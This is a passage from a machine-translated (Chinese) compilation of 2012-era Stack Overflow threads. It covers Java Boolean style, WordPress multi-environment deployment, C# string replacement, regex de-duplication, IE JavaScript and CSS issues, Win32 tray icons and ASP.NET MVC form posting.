> 时间：2012-10-18T12:44:36.270

事实上，使用自动拆箱`Boolean`常量的风格与许多 Java 项目所特有的整体冗长非常吻合。例如：

```
public boolean isItOrIsItNotTheValueWeExpect(String aStringParameterThatCouldBeNull) {
  boolean booleanReturnValue = Boolean.FALSE;
  if (aStringParameterThatCouldBeNull != null) {
    if (aStringParameterThatCouldBeNull.length() > 3) {
      booleanReturnValue = Boolean.TRUE;
    }
    else {
      booleanReturnValue = Boolean.FALSE;
    }
  }
  else if (aStringParameterThatCouldBeNull == null) {
    booleanReturnValue = Boolean.TRUE.booleanValue();
  }
  return booleanReturnValue;
} 
```

显然，上面的代码比这种难以理解的混乱要好得多：

```
public boolean validate(String s) {
  return s == null? true : s.length() > 3;
} 
```

三元运算符的出现被认为是违规行为，一些项目甚至将其标记为 CheckStyle。

如果您的项目符合这些风格准则，那可能证明您的可疑代码行是合理的。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-10-18T12:46:21.057

没有充分的理由这样做，它可能只是一个新手 Java 程序员。我不会太担心，只需将其替换为false即可。

同时，您通常可以（如果不是总是）安排您的代码，这样您就永远不会声明一个您没有最终值的变量，即，使您的对象不可变，这使它们更容易考虑。x的值是多少？相比于调用 foo() 和 bar() 之间的 x 值是多少？第一个通常更容易回答。这需要您按照您可能不习惯的方式来划分课程，但我建议您至少尝试一下。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-10-18T12:37:43.517

尽管第一种方法不适用于 1.4 或更早版本的 JVM，但实际上并没有什么区别。第一个更复杂，因为它从布尔对象中获取静态值，然后依靠自动装箱（在 1.5 中引入）将其从布尔对象更改为布尔原语）虽然我无法想象它会做出任何速度区别。

一般来说，如果你假设一个变量有一个特定的初始值，那么我会建议初始化它而不是仅仅声明它，因为它使代码更具可读性。

# wordpress - WordPress网站的团队开发

> ID：12954788
> 
> 赞同：4
> 
> 时间：2012-10-18T12:33:58.123
> 
> 标签：wordpress

我不是 Wordpress 开发人员，但我正在尝试确定一个团队使用 Wordpress 的最佳方式。对于 Rails 项目或大多数其他项目，在本地工作和在上游部署很容易，但我的理解是 Wordpress 并没有让这变得那么容易。也许这是一个神话？

据我所知，将 URL 和文件路径存储在数据库中的情况并不少见，这似乎会使从 dev --> stg --> prd 部署 WP 项目变得困难（每个环境都有自己的 URL以及可能不同的文件路径），更不用说个别开发人员拥有自己的开发环境，需要“合并”到统一的副本中进行部署。

我可以将所有开发人员沙箱配置为使用单个数据库，但同样，如果存储了 URL 和文件路径，则什么也得不到。

这里有一系列较小的问题，但我越想这些，我就越意识到我真正想要的是关于如何构建事物以优化 WordPress 网站的建议，该网站将被黑客入侵开发人员团队。我*更喜欢*我们用于其他项目的沙盒方法，但我不知道一旦所有开发完成后是否/如何统一事物。

李来帮忙？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T15:46:53.473

**警告：**传入的文字墙..

@Rob，当谈到团队合作时，WP 简直就是地狱；然而，通过一些工作（和一些符号链接魔法），您可以设置您的 WP 项目，以便您的主题或插件的工作文件可以独立于 WP 核心。其中一些使用 WP 的内置机制，其中一些与 SVN 外部相关（提示）。我会让你用谷歌搜索，因为它超出了你的问题范围。

## 关于 WP GUID 的说明

**警告：**不要更换导向装置。WP GUID 可用于外部提要阅读器。提要阅读器使用 GUID 来确定内容是否是最新的。更改它基本上会告诉那些读者，提要中的每个条目都是新的（尤其是对于帖子）。这会为您不需要的遗留内容带来很多额外的开销。GUID 是一项旧功能，很久以前就应该更改为 UUID。从技术上讲，您可以使用 guid 字段中的任何内容，但 WP 使用永久链接来填充该字段 - 遗留。

唯一可以接受更改 GUID 的情况是新的 wp 项目，其中内容是全新的。

# 要回答您的问题：

WP 在其数据库中的十几个地方存储对当前域的显式引用。这些位置很难追踪和更改，您最不想做的事情是手动编辑您要导入生产的 *.sql 转储文件。它只是带有不良开发实践的味道。

有几种方法可以解决这个问题，但如果您已经进入了开发生命周期，这意味着需要做一些工作。我将解决第一种情况。

## 案例 1：项目启动

当您开始项目时，您可能已经准备好开发沙箱和数据库。您现在可能已经安装了 WP，因此对于所有意图和目的而言，它基本上都是干净的。

您要做的第一件事是更改配置文件的工作方式。大多数人都保留标准`wp-config.php`文件（除了团队生产项目，实际上没有任何理由编辑它。）但是，您可以使用一些逻辑对其进行设置，以包含特定于开发人员或特定于环境的配置文件。例如：

**wp-config.php**

```
switch( $current_environment )
{
 case 'jack.local'  : include( 'wp-config-jack.php' )  break; // Jack's sandbox
 case 'jill.local'  : include( 'wp-config-jill.php' ) break; // Jill's sandbox
 default : ...  break; // Staging & Production
} 
```

您要做的下一件事是将文件的正常内容包含`wp-config.php`在一个`wp-config-remote.php`文件中以用于登台/生产。接下来，编辑您的`wp-config-remote.php`文件，以便您可以在多个环境（暂存、生产）中使用 1 个配置文件。一个`if(...)`或`switch(...)`块就是你所需要的，例如

```
if( (strpos( $_SERVER[ "HTTP_HOST" ], "localhost" ) !== false) || (strpos( $_SERVER[ "HTTP_HOST" ], "local" ) !== false) ) 
```

（有更好的方法来写那个条件......这只是一个粗略的例子。）

配置特定于每个远程环境的所有 WP 设置。希望您将其签入源代码控制存储库。

这基本上可以让您腾出时间，让您的团队拥有特定于其环境的配置设置，同时让您检查每个远程环境的设置**一次**。

您要做的第二件事是建立一种机制来拦截和过滤特定于域的链接。此机制背后的意图是用令牌/占位符替换对当前域的任何引用。我在这里概述了执行此操作的技术：http: [//www.farfromfearless.com/2010/09/07/url-token-replacement-techniques-for-wordpress-3-0/](http://www.farfromfearless.com/2010/09/07/url-token-replacement-techniques-for-wordpress-3-0/)

它基本上相当于创建一个过滤器，在内容提交到数据库之前和内容呈现到页面之前对内容起作用。该技术是透明的，因为它不会影响正常的编辑实践。您仍然可以在编辑器中创建内容，参考其他页面、帖子、图像等，并且在不同环境中编辑时它们会很好地显示出来。

在最近的项目中，我将所有这些和其他一些 WP“规范化”功能打包到一个我设置并忘记的引导插件中。

## 案例2：正在进行的项目

现在，就您而言，您在开发生命周期中走得更远。替换这些域引用需要做一些工作，但如果您按照我在上面概述的步骤进行操作，您应该只需要执行一次。我在上面提供的链接为您提供了完成这项工作所需的 SQL。请务必注意，在多站点环境中，您需要为您创建的每个“子站点”执行此操作。

更新数据库后，我建议您实施**案例 1**中的步骤，这样您就不必再次重复这些步骤。

## 奖励：同步内容

同步内容很痛苦。我在最近的项目中所做的是让客户在登台服务器上工作，并将变更上游推广到生产。那么，这让您可以将下游同步到您的沙箱。编写一个 shell 脚本，从暂存数据库中转储 SPECIFIC 内容表的副本，并将它们导入到沙盒数据库中（有效地替换内容表。）您应该能够看到域令牌替换技术的好处。

未检入源代码控制的图像（例如客户端图像）应推送到公共位置，例如 S3 存储桶。有 WP 插件可以帮助您。这将节省大量跨环境同步资产的时间。

我希望这对您有所帮助——如果没有，总会有 SilverStripe ;)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-15T14:57:27.547

我自己在启动一个新网站时遇到了这个问题。我的解决方案是使用[Vagrant](http://www.vagrantup.com)。Vagrant 也与平台无关，因此您可以在 Mac 上进行开发，而队友正在使用 Windows。相同的 Vagrant 项目在两者上运行。

我写了一篇关于如何在你的机器上本地运行的生产环境中使用 Wordpress 设置 Vagrant 的指南。我不经常使用 Wordpress，但每次我在我的 Mac 上设置 Apache 和 PHP 总是很麻烦，然后确保所有 Wordpress 网站的 URL 都在数据库中更新。

一旦你配置了你的 Vagrant 项目，你的团队中的任何开发人员都可以通过一个命令来启动并运行本地的 Wordpress 实例。简而言之，Vagrant 会将你的项目目录从你的宿主机挂载到客户机上，并通过客户机运行 Apache、MySQL、PHP。您仍然使用主机的 IDE（如您通常那样）和主机浏览器。无需在任何地方上传文件，只需在本地计算机上编写代码、保存、刷新浏览器即可。

[http://www.distilnetworks.com/wordpress-development-with-vagrant/](http://www.distilnetworks.com/wordpress-development-with-vagrant/) <- 解释如何使用 Vagrant 进行设置

[https://gist.github.com/markmalek/fd2e6e65385400d9cd47](https://gist.github.com/markmalek/fd2e6e65385400d9cd47) <- 配置 Vagrant 时的 shell 脚本

shell 脚本可能会好很多，这对我有用，但我很想听听一些更好的建议或想法。我是 Vagrant 的新手，现在将它用于我们的其他一些项目，所以我认为它也很适合这里。

我确实更新了 shell 脚本中的 GUID，我在另一个你不应该这样做的答案中读到了它，因为提要阅读器使用它。在这种情况下，它无关紧要，因为它仅适用于您的本地 Wordpress 实例，但我不会在生产中进行此更改。请参阅[此答案](https://stackoverflow.com/questions/12954788/team-development-of-a-wordpress-site/12958581#12958581)以获得更好的解释。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T13:26:18.017

我们很容易在开发服务器上构建并使用以下 sql 查询移动到实时服务器：

```
UPDATE wp_posts SET guid = REPLACE(guid, 'devserver.com', 'liveserver.com');
UPDATE wp_posts SET post_content = REPLACE(post_content, 'devserver.com', 'liveserver.com');
UPDATE wp_options SET option_value = REPLACE(option_value, 'devserver.com', 'liveserver.com'); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-18T13:40:11.693

去年，我编写了一个 bash 脚本，将实时 MU 安装镜像到沙箱中。它不是完美的，也不是理想的，而是一个很好的起点。它包括镜像数据库、文件和重写镜像数据库以反映沙箱。

请参阅[http://pp19dd.com/2011/01/bash-script-to-mirror-wordpress-mu-installation-into-a-sandbox/](http://pp19dd.com/2011/01/bash-script-to-mirror-wordpress-mu-installation-into-a-sandbox/)

对于开发人员来说，能够获取实时和准确的内容快照以复制条件非常重要。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-03-27T04:08:29.500

没什么大不了的，只需使用一个 wp 迁移插件备份您的整个站点并在实时服务器安装时导入，插件将自动替换所有 url。

# c# - 如何使用其他字符串从确定位置更改一个字符串？

> ID：12954789
> 
> 赞同：1
> 
> 时间：2012-10-18T12:34:02.057
> 
> 标签：c#, .net, string

我有两个字符串

```
string str1 = "Hello World !"; // the position of W character is 6
string str2 = "peace";
//...
string result = "Hello peace !"; // str2 is written to str1 from position 6 
```

有没有这样的功能：

```
string result = str1.Rewrite(str2, 6); // (string, position) 
```

**编辑了**
这个“Hello World！” 只是一个例子，我不知道这个字符串中是否有“W”字符，我只知道：`str1`, `str2`, position ( `int`)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T12:40:14.153

没有，但您可以使用扩展方法创建一个。

```
public static class StringExtensions
{
    public static string Rewrite(this string input, string replacement, int index)
    {
        var output = new System.Text.StringBuilder();
        output.Append(input.Substring(0, index));
        output.Append(replacement);
        output.Append(input.Substring(index + replacement.Length));
        return output.ToString();
    }
} 
```

然后，您在原始问题中发布的代码将起作用：

```
string result = str1.Rewrite(str2, 6); // (string, position) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T14:11:27.763

从代码可理解性的角度来看，@danludwigs 的答案更好，但是这个版本要快一点。您正在处理字符串格式的二进制数据（wtf bbq btw :)）的解释确实意味着速度可能至关重要。虽然使用字节数组或其他东西可能比使用字符串更好:)

```
public static string RewriteChar(this string input, string replacement, int index)
{
  // Get the array implementation
  var chars = input.ToCharArray();
  // Copy the replacement into the new array at given index
  // TODO take care of the case of to long string?
  replacement.ToCharArray().CopyTo(chars, index);
  // Wrap the array in a string represenation
  return new string(chars);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T12:38:19.217

有很多方法可以做到这一点......

因为我是一个懒惰的屁股，我会去：

```
result = str1.Substring(0, 6) + str2 + str1.Substring(12, 2); 
```

或者

```
result = str1.Replace("World", str2); 
```

我的建议是，在 Visual Studio 中，右键单击“字符串”并选择“转到定义”。您将看到字符串“class”可用的所有方法。

# regex - 正则表达式查找/删除重复行

> ID：12954792
> 
> 赞同：0
> 
> 时间：2012-10-18T12:34:09.387
> 
> 标签：regex, replace

我有这一行，有时在 html 文件中重复，我想：

1-获取一个正则表达式来查找具有该行重复的文件

2-获取一个正则表达式来搜索并删除它在文件中出现的第二个实例，并保留第一个。所以它只保留第一个，而不是第二个

鉴于这些行不是一个接一个的，它们被大量的代码和文本隔开。

该行是：

```
<script src="/resources/common.js" type="text/javascript"></script> 
```

或者它可能在需要删除的行之前或之后有单词，例如：

```
<script src="/resources/common.js" type="text/javascript"></script><div id=something"... 
```

我使用 Notepad++ 进行搜索和替换。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T13:04:38.473

如果您使用的是[EditPad Pro](http://www.editpadpro.com)（或免费的[EditPad Lite](http://www.editpadlite.com)），这很容易：

搜索

```
(?s)(?<=<script src="/resources/common\.js" type="text/javascript"></script>.*)<script src="/resources/common\.js" type="text/javascript"></script> 
```

并一无所有。

一个屏幕截图来澄清：

![EPP 截图](../Images/6abff7b2311d4c53b03a81c9b95b1e0c.png)

对于其他编辑器，您必须重复应用以下正则表达式（每次重复一次）：

```
(?s)(?<=<script src="/resources/common\.js" type="text/javascript"></script>)(.*?)<script src="/resources/common\.js" type="text/javascript"></script> 
```

但这次将匹配替换为`\1`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:55:25.273

您可以考虑使用用于查找和**不**匹配的正向查找，您可以使用它来查找您的行的第一次出现，然后匹配其余的出现。

试试这个。它将匹配除第一个之外的所有出现的行。

`(?<=<script src=./resources/common.js..+?</script>.*?)(<script src=./resources/common.js..+?</script>)`

***注意***：根据您使用的正则表达式引擎，积极的后视可能会或可能不会起作用，但它应该在大多数情况下都有效。*

* * *

**更多信息：** [正则表达式环视](http://www.regular-expressions.info/lookaround.html)

# android - 在android中对已安装的应用程序进行排序？

> ID：12954794
> 
> 赞同：0
> 
> 时间：2012-10-18T12:34:21.757
> 
> 标签：android, sorting

我可以使用 . 我想根据用户的一些输入过滤应用程序，例如

视频播放器 音乐播放器 游戏

等等..，是否有一些属性可以提供这种类型的详细信息，或者是维护单独表格的唯一方法，尽管这是不可能的，因为 Playstore 中可用的应用程序列表几乎是无穷无尽的......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T13:45:55.293

> 是否有一些属性可以提供这种类型的详细信息

不。

> 尽管这是不可能的，因为 Playstore 中可用的应用程序列表几乎是无穷无尽的

正确的。因此，你想要的是“有点不可能”。

# javascript - IE 中的动态数组未定义错误

> ID：12954795
> 
> 赞同：0
> 
> 时间：2012-10-18T12:34:22.087
> 
> 标签：javascript, html

我试图生成动态控制。它正在 FF 上工作，但 IE 给出错误：

> `divcntrl[i]`未定义。

请检查以下代码：

```
 var mc=document.getElementById("maindiv");
    var divcntrl = new Array();
    for(var i=0; i<10;i++) {
      divcntrl[i]=document.createElement("div");\\error here
    divcntrl[i].setAttribute("id","div"+ i);
      mc.appendChild(divcntrl[i]);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:37:28.730

没有`<div1>`元素这样的东西。[在小提琴](http://jsfiddle.net/WAPX3/)中运行您的代码，它运行没有错误，所以问题出在其他地方。您是否缓存了错误版本的文件？

```
var mc=document.getElementById("maindiv");
var divcntrl = new Array();
for(var i=0; i<10;i++) {
    divcntrl[i]=document.createElement("div");
    divcntrl[i].innerHTML = i;
    mc.appendChild(divcntrl[i]);
}​ 
```

我想你会想把它编码得更像

```
var mc = document.getElementById("maindiv");
var divcntrl = [];
for (var i=0; i<10; i++) {
    var div = document.createElement("div");
    div.id = "div" + i;
    div.innerHTML = i;
    divcntrl.push(div);
    mc.appendChild(div);
}​ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:37:08.483

您可以创建一个`DIV`元素，而不是一个`"div"+i`元素，因为`"div"+i`它不属于任何 HTML 规范（“div1”不是 HTML 元素）。您是否混淆了“div”和“id”？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T12:39:55.307

问题在于这条线

```
divcntrl[i]=document.createElement("div" + i); 
```

试试这个：

```
var divElt = document.createElement("div");
divElt.id = i;
divcntrl[i] = divElt; 
```

# c++ - shell_notifyicon ：尝试引用不存在的令牌，未显示图标

> ID：12954796
> 
> 赞同：3
> 
> 时间：2012-10-18T12:34:23.707
> 
> 标签：c++, windows, winapi

我看到通知气球，但没有显示图标。并且在成功（返回 TRUE）调用 Shell_NotifyIcon 后出现 Windows 错误：尝试引用不存在的令牌。主要问题是为什么我看不到图标？Windows 7 与最新更新一起使用。

这是一个代码片段：

```
namespace tray_tip
{
#define FINAL_INIT( tip, title, ic, icon_id, inst )\
    if ( icon )\
    {\
        static const GUID myGUID = \
        {0x23977b55, 0x10e0, 0x4041, {0xb8, 0x62, 0xb1, 0x95, 0x41, 0x96, 0x36, 0x69}};\
        data.guidItem = myGUID;\
        data.dwInfoFlags |= NIF_ICON;\
        ExtractIconEx( _T("task_dialog_test.ico"), 0, NULL, &(data.hIcon), 1 );\
    }\
    data.dwInfoFlags |= ic;\
    _tcscpy_s( data.szInfo, tip );\
    _tcscpy_s( data.szInfoTitle, title );

    static NOTIFYICONDATA data = {0};
    inline void init( HWND const & parent, UINT const & msg_id, UINT const & time_out = 30 )
    {
        ULONGLONG ullVersion = GetDllVersion( _T( "Shell32.dll" ) );
        if ( ullVersion > MAKEDLLVERULL ( 6,0,0,0 ) )
            data.cbSize = sizeof ( NOTIFYICONDATA );
        else if ( ullVersion == MAKEDLLVERULL( 6,0,0,0 ) )
            data.cbSize = sizeof( NOTIFYICONDATA_V3_SIZE );
        else if ( ullVersion >= MAKEDLLVERULL( 5,0,0,0 ) )
            data.cbSize = NOTIFYICONDATA_V2_SIZE;
        else 
            data.cbSize = NOTIFYICONDATA_V1_SIZE;
        data.hWnd = parent;
        data.uFlags = NIF_INFO | NIF_MESSAGE;// | NIF_SHOWTIP;
        data.uCallbackMessage = msg_id;
        data.uTimeout = time_out;
    }
    inline BOOL show( BOOL show = FALSE, TCHAR tip[256] = _T(""), TCHAR title[64] = _T(""), DWORD const & ic = NIIF_INFO, UINT const & icon = 0, HINSTANCE const & inst_h = NULL )
    {
        FINAL_INIT( tip, title, ic, icon, inst_h );
        return Shell_NotifyIcon( show == TRUE ? NIM_ADD : NIM_DELETE, &data ); // function checks if version can be changed if it was preset.
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T20:36:02.370

O.K., here is my proposal on a solution. For Windows 7 there is a specific way to identify an icon. Each icon in the notification area can be identified in two ways. The GUID with which the icon is declared in the registry. This is the preferred method on Windows 7 and later. The handle of a window associated with the notification area icon, plus an application-defined icon identifier. This method is used on Windows Vista and earlier. Thus, when specifying data.uID Windows 7 should not make unique ID from parent handle and uID field value, but from specified GUID ( Global Unique Identifier ). Therefore, when sending any message to notification area icon using uID there will be zero (error ID) returned by ShellNotify_Icon. However, when creating GUID, for example using tool GuidGen supplied with VS2010 tools, which takes machine network card address and ID, machine configuration, current date and time, random component, Windows 7 will have a unique ID to treat. More information you may get in MSDN from link mentioned in my comment to Hans Passant message.

Here is a code snippet, which works:

```
namespace tray_tip
{

#define FINAL_INIT( tip, title, ic, icon_id, inst_h )\
    data.uFlags |= NIF_ICON;\
    LoadIconMetric(inst_h, MAKEINTRESOURCE(icon_id), LIM_SMALL, &(data.hIcon));\
    static const GUID ic_guid = { 0xa351efe, 0x9642, 0x4acc, { 0xb3, 0x25, 0xec, 0x1a, 0x49, 0x91, 0x75, 0xaf } };\
    data.uFlags |= NIF_GUID;\
    data.guidItem = ic_guid;\
    data.dwStateMask = NIS_HIDDEN;\
    data.dwInfoFlags |= ic;\
    _tcscpy_s( data.szInfo, tip );\
    _tcscpy_s( data.szInfoTitle, title );

//#define FINAL_INIT( tip, title, ic, icon_id, inst_h )\
//  data.uFlags |= NIF_ICON;\
//  LoadIconMetric(inst_h, MAKEINTRESOURCE(icon_id), LIM_SMALL, &(data.hIcon));\
//  data.uID = icon_id,\
//  data.dwStateMask = NIS_HIDDEN;\
//  data.dwInfoFlags |= ic;\
//  _tcscpy_s( data.szInfo, tip );\
//  _tcscpy_s( data.szInfoTitle, title );
    static NOTIFYICONDATA data = {0};
    inline void init( HWND const & parent, UINT const & msg_id, UINT const & time_out = 30 )
    {
        ULONGLONG ullVersion = GetDllVersion( _T( "Shell32.dll" ) );
        if ( ullVersion > MAKEDLLVERULL ( 6,0,0,0 ) )
            data.cbSize = sizeof ( NOTIFYICONDATA );
        else if ( ullVersion == MAKEDLLVERULL( 6,0,0,0 ) )
            data.cbSize = sizeof( NOTIFYICONDATA_V3_SIZE );
        else if ( ullVersion >= MAKEDLLVERULL( 5,0,0,0 ) )
            data.cbSize = NOTIFYICONDATA_V2_SIZE;
        else 
            data.cbSize = NOTIFYICONDATA_V1_SIZE;
        data.hWnd = parent;
        data.uFlags = NIF_INFO | NIF_MESSAGE;
        data.uCallbackMessage = msg_id;
        data.uTimeout = time_out;
    }
    inline BOOL show( BOOL show = FALSE, TCHAR tip[256] = _T(""), TCHAR title[64] = _T(""), DWORD const & ic = NIIF_INFO, UINT const & icon_id = 0, HINSTANCE const & inst_h = NULL )
    {
        FINAL_INIT( tip, title, ic, icon_id, inst_h );
        data.dwState = show ? 0 : 1;
        static bool added = false;
        if ( added || ( !added && show ) )
        {
            added = true;
            return  Shell_NotifyIcon( show == TRUE ? NIM_ADD : NIM_DELETE, &data ); // function checks if version can be changed if it was preset.
        }
        else 
            return 0;
    }

} // namespace tray_tip 
```

# css - IE 问题：hover

> ID：12954803
> 
> 赞同：0
> 
> 时间：2012-10-18T12:34:43.097
> 
> 标签：css

我试图弄清楚为什么我的 CSS 在 IE (v.9) 中不起作用。

我有以下CSS：

```
#cq div:hover {
   background-color: #fff;
   cursor: pointer
} 
```

和 HTML

```
<div id="cq">
    <div>item</div>
    <div>item</div>
</div> 
```

它在所有其他浏览器中都能正常工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:58:23.080

问题可能是您的页面在 Quirks 模式下运行。尝试将您的文档类型更改为：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
```

有关浏览器模式的更多信息：http: [//hsivonen.iki.fi/doctype/](http://hsivonen.iki.fi/doctype/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:43:20.587

它工作正常。尝试改变背景颜色

```
#cq div:hover {
background-color: red;
 cursor: pointer;
}

<div id="cq">
<div>item</div>
<div>item</div>
 </div> 
```

这里是[演示](http://jsfiddle.net/p7kLc/)

# iphone - iPhone 5 应用程序将如何在旧 iPhone 上运行？

> ID：12954804
> 
> 赞同：2
> 
> 时间：2012-10-18T12:34:42.573
> 
> 标签：iphone, objective-c, xcode, iphone-4, iphone-5

> **可能重复：**
> [如何为 iPhone 5 屏幕分辨率开发或迁移应用程序？](https://stackoverflow.com/questions/12395200/how-to-develop-or-migrate-apps-for-iphone-5-screen-resolution)

iPhone 5 应用程序将如何在旧 iPhone 上运行？

例如，如果我创建一个应用程序来利用 4 英寸屏幕，我是否还必须创建另一个版本的应用程序来支持旧的 3.5 英寸屏幕？

**附言**

我以**编程**方式进行。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:36:37.013

如果您在界面构建器中启用自动布局，它将支持 iPhone 的两种屏幕尺寸。如果以编程方式执行此操作，则会出现类似的问题。 [为以编程方式生成的视图实现自动布局](https://stackoverflow.com/questions/12593153/implementing-auto-layout-for-views-generated-programmatically)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-18T12:37:21.863

Apple 添加了一个叫做 AutoLayout 的东西。他们将此添加到 iOS（和 OSX）SDK 中，通过允许您为视图元素设置约束来应对屏幕分辨率差异。

[这是文档](https://developer.apple.com/library/mac/#documentation/UserExperience/Conceptual/AutolayoutPG/Articles/Introduction.html)

要以编程方式使用它，您可以使用[NSLayoutConstraint定义约束](https://developer.apple.com/library/ios/#documentation/AppKit/Reference/NSLayoutConstraint_Class/NSLayoutConstraint/NSLayoutConstraint.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-18T12:40:18.937

尝试使用自动布局概念，它会工作，

[http://www.raywenderlich.com/20881/beginning-auto-layout-part-1-of-2](http://www.raywenderlich.com/20881/beginning-auto-layout-part-1-of-2)

[http://www.raywenderlich.com/20897/beginning-auto-layout-part-2-of-2](http://www.raywenderlich.com/20897/beginning-auto-layout-part-2-of-2)

# c# - 如何将文本框值从视图传递到 MVC 4 中的控制器？

> ID：12954806
> 
> 赞同：12
> 
> 时间：2012-10-18T12:34:47.857
> 
> 标签：c#, asp.net-mvc, asp.net-mvc-4

在这里，我从数据库中获取值并将其显示在输入字段中

```
<input type="text" id="ss" value="@item.Quantity"/> 
```

并且从数据库中获取的值是`1`。然后我将输入字段值更改为`2` 并在操作单击中将该值传递给控制器

```
 <a id="imgUpdate"  href="@Url.Action("Update", "Shopping", new { id = Request.QueryString["UserID"], productid = item.ProductID, qty = item.Quantity, unitrate = item.Rate })"> 
```

但在控制器部分，我得到了1 `old value`。`qty`但我需要那个`updated value 2``qty`

```
public ActionResult Update(string id, string productid, int qty, decimal unitrate)
        {
            if (ModelState.IsValid)
            {
                int _records = UpdatePrice(id,productid,qty,unitrate);
                if (_records > 0)
                {
                    return RedirectToAction("Index1", "Shopping");
                }
                else
                {
                    ModelState.AddModelError("","Can Not Update");
                }
            }
            return View("Index1");
        } 
```

有什么建议吗？

**编辑：**

```
 @using (Html.BeginForm("Update", "Shopping", FormMethod.Post))
     {

                @Html.Hidden("id", @Request.QueryString["UserID"] as string)
                @Html.Hidden("productid", item.ProductID as string)
                @Html.TextBox("qty", item.Quantity)
                @Html.Hidden("unitrate", item.Rate)

                <input type="submit" value="Update" />
     } 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-10-18T12:50:13.970

您可以使用简单的形式：

```
@using(Html.BeginForm("Update", "Shopping"))
{
    <input type="text" id="ss" name="qty" value="@item.Quantity"/>
    ...
    <input type="submit" value="Update" />
} 
```

并在此处添加属性：

```
[HttpPost]
public ActionResult Update(string id, string productid, int qty, decimal unitrate) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-18T12:52:48.147

当您想将新信息传递给您的应用程序时，您需要使用 POST 表单。在 Razor 中，您可以使用以下内容

**查看代码：**

```
@* By default BeginForm use FormMethod.Post *@
@using(Html.BeginForm("Update")){
     @Html.Hidden("id", Model.Id)
     @Html.Hidden("productid", Model.ProductId)
     @Html.TextBox("qty", Model.Quantity)
     @Html.TextBox("unitrate", Model.UnitRate)
     <input type="submit" value="Update" />
} 
```

**控制器的动作**

```
[HttpGet]
public ActionResult Update(){
     //[...] retrive your record object
     return View(objRecord);
}

[HttpPost]
public ActionResult Update(string id, string productid, int qty, decimal unitrate)
{
      if (ModelState.IsValid){
           int _records = UpdatePrice(id,productid,qty,unitrate);
           if (_records > 0){                    {
              return RedirectToAction("Index1", "Shopping");
           }else{                   
                ModelState.AddModelError("","Can Not Update");
           }
      }
      return View("Index1");
 } 
```

请注意，或者，如果您想使用`@Html.TextBoxFor(model => model.Quantity)`，您可以输入带有名称的输入（尊重大小写）`"Quantity"`，或者您可以更改您的 POST Update() 以接收对象参数，这与您的严格类型视图的类型相同。这是一个例子：

**模型**

```
public class Record {
    public string Id { get; set; }
    public string ProductId { get; set; }
    public string Quantity { get; set; }
    public decimal UnitRate { get; set; }
} 
```

**看法**

```
@using(Html.BeginForm("Update")){
     @Html.HiddenFor(model => model.Id)
     @Html.HiddenFor(model => model.ProductId)
     @Html.TextBoxFor(model=> model.Quantity)
     @Html.TextBoxFor(model => model.UnitRate)
     <input type="submit" value="Update" />
} 
```

**事后行动**

```
[HttpPost]
public ActionResult Update(Record rec){ //Alternatively you can also use FormCollection object as well 
   if(TryValidateModel(rec)){
        //update code
   }
   return View("Index1");
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-18T12:37:37.517

您的链接是在页面**加载**时生成的，因此它将始终具有原始值。您需要通过 javascript 设置链接

您也可以将其包装在一个表单中，并为`id`、`productid`和 隐藏字段`unitrate`

这是给你的[样本](http://jsfiddle.net/Eonasdan/ytb2h/1/)。

**HTML**

```
<input type="text" id="ss" value="1"/>
<br/>
<input type="submit" id="go" onClick="changeUrl()"/>
<br/>
<a id="imgUpdate"  href="/someurl?quantity=1">click me</a> 
```

**JS**

```
function changeUrl(){
   var url = document.getElementById("imgUpdate").getAttribute('href');
   var inputValue = document.getElementById('ss').value;
   var currentQ = GiveMeTheQueryStringParameterValue("quantity",url);
    url = url.replace("quantity=" + currentQ, "quantity=" + inputValue);
document.getElementById("imgUpdate").setAttribute('href',url)
}

    function GiveMeTheQueryStringParameterValue(parameterName, input) {
    parameterName = parameterName.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
    var regex = new RegExp("[\\?&]" + parameterName + "=([^&#]*)");
    var results = regex.exec(input);
    if (results == null)
        return "";
    else
        return decodeURIComponent(results[1].replace(/\+/g, " "));
} 
```

这可以根据需要进行清理和扩展，但示例有效

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-08-27T14:04:00.720

我将尝试回答这个问题，但我的示例非常简单，因为我是 mvc 的新手。希望这对某人有所帮助。

```
 [HttpPost]  ///This function is in my controller class
    public ActionResult Delete(string txtDelete)
    {
        int _id = Convert.ToInt32(txtDelete); // put your code           
    } 
```

此代码在我的控制器的 cshtml 中

```
 >   @using (Html.BeginForm("Delete", "LibraryManagement"))
 {
<button>Delete</button>
@Html.Label("Enter an ID number");
@Html.TextBox("txtDelete")  } 
```

只需确保文本框名称和控制器的函数输入具有相同的名称和类型（字符串）。这样，您的函数将获得文本框输入。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-07-16T12:51:57.883

